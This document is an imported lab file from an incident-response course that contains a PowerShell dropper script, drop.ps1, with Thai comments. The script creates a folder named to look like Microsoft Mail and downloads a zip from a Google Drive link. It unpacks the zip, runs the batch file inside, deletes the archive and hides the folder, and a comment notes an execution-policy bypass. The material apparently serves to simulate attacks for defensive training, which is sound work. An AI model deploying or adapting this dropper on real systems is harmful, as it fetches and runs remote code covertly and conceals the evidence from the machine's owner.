---
title: "drop"
type: "acs-advance-text"
course: "ACS Advanced"
course_folder: "Incident Response"
source_path: "E:\\ProJect\\ACS File\\advance\\Incident Response\\Lab\\Lecture 26 Down drop\\drop.ps1"
source_size_bytes: 2268
source_modified: 2025-12-07T15:28:00
imported_at: 2026-06-14T14:27:16
tags:
  - acs
  - acs-advanced
  - imported
---

# drop

- Source: [drop.ps1](file:///E:/ProJect/ACS%20File/advance/Incident%20Response/Lab/Lecture%2026%20Down%20drop/drop.ps1)

## Content

```ps1
Add-Type -AssemblyName System.IO.Compression.FileSystem

# 1. แก้ไข Path เป็น C:\Temp เพื่อเลี่ยงปัญหา Permission
$BasePath = "C:\Downloads\Microsoft Mail"

function Create-BaseDirectory {
    if (!(Test-Path -Path $BasePath)) {
        New-Item -Force -ItemType directory -Path $BasePath
        Write-Output "[+] Base Directory Created at $BasePath"
    } else {
        Write-Output "[!] Base Directory Already Exists"
    }
}

function Downlaod-File {
    $url1 = "https://drive.usercontent.google.com/u/1/uc?id=1jZ76P7jiONUv_wzh-1-kk0Vf0Yc3Qttr&export=download"
    $dest1 = "$BasePath\act.zip"
    
    # 2. เพิ่ม TLS 1.2
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    
    try {
        # 3. ใช้ Invoke-WebRequest แทน WebClient (เสถียรกว่า)
        Invoke-WebRequest -Uri $url1 -OutFile $dest1
        Write-Output "[+] Success Download"
    }
    catch {
        Write-Output "[-] Download Failed: $_"
    }
}

function Unzip {
    param([string]$zipfile, [string]$outpath)
    if (Test-Path $zipfile) {
        # ลบโฟลเดอร์ปลายทางก่อนแตกไฟล์เพื่อป้องกัน error ซ้ำ
        if (Test-Path $outpath) { Remove-Item $outpath -Recurse -Force }
        [System.IO.Compression.ZipFile]::ExtractToDirectory($zipfile, $outpath)
        Write-Output "[+] Success Unzip"
    } else {
        Write-Output "[-] Zip file not found!"
    }
}

function Hide-Action {
    if (Test-Path "$BasePath\act.zip") { Remove-Item -Path "$BasePath\act.zip" }
    
    if (Test-Path $BasePath) {
        $End_Task = Get-Item $BasePath -Force
        $End_Task.Attributes = "Hidden"
        Write-Output "[+] Success Hide_Action"
    }
}

# --- Main Execution ---
Create-BaseDirectory
Downlaod-File
Unzip "$BasePath\act.zip" "$BasePath\Act"
# ตรวจสอบว่าไฟล์ bat มีจริงไหมก่อนรัน
if (Test-Path "$BasePath\Act\action.bat") {
    Start-Process "$BasePath\Act\action.bat"
}
Hide-Action

#  Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process
```
